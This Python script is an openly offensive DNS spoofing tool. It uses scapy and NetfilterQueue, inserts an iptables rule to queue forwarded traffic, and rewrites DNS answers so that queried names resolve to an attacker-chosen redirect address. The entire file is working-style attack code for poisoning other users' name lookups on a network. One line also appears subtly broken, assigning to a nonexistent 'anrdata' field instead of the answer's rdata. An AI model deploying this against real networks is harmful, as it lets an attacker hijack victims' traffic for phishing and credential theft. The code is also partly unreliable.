from scapy.all import *
import time
import threading

from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

from netfilterqueue import NetfilterQueue

global listening
global list_of_dns


class DnsSpoofing:
    def __init__(self, attacker_website_redirect):
        self.attacker_website_redirect = attacker_website_redirect

    def process_dns(self, packet):
        my_packet = IP(packet.get_payload())

        if my_packet.haslayer(DNSRR):
            try:
                my_packet = self.modify_packet(my_packet)
            except IndexError:
                # not UDP packet, this can be IPerror/UDPerror packets
                pass
            print(my_packet.show())
            packet.set_payload(bytes(my_packet))

        packet.accept()

    def modify_packet(self, packet):
        qname = packet[DNSQR].qname

        packet[DNS].an = DNSRR()
        packet[DNS].an.rrname = qname
        packet[DNS].anrdata = self.attacker_website_redirect

        packet[DNS].ancount = 1

        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum

        return packet

    def execute_poisoning(self):
        QUEUE_NUMBER = 0
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUMBER))

        the_queue = NetfilterQueue()

        try:
            the_queue.bind(QUEUE_NUMBER, self.process_dns)
            the_queue.run()
        except KeyboardInterrupt:
            the_queue.unbind()






